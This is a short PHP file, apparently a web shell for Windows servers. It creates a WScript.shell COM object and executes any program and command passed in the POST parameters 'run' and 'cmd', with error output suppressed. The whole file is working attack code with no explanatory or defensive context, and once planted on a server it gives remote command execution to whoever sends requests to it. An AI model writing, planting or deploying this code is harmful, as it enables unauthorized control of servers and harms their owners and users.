<?php
$shell = new COM("WScript.shell");
$run = $_POST['run'];
$cmd = $_POST['cmd'];
@$shell->ShellExecute($run,'/c '.$cmd);
?>